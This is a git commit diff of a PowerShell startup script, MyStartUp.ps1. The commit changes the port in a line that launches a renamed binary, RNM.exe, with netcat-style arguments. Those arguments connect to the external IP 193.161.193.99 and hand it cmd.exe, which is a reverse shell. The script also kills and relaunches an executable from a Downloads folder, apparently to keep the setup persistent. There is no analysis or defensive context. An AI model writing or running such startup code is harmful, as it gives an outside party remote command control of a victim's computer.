5cb6338f368186f98d904757ddc5ac3646c7f9b0
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-04-13 17:17:01 -0400

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,3 @@
 taskkill /F /IM lml.exe
 C:\Users\ALOOO\Downloads\lml.exe
-Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 26990 -e cmd.exe"
+Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 47524 -e cmd.exe"
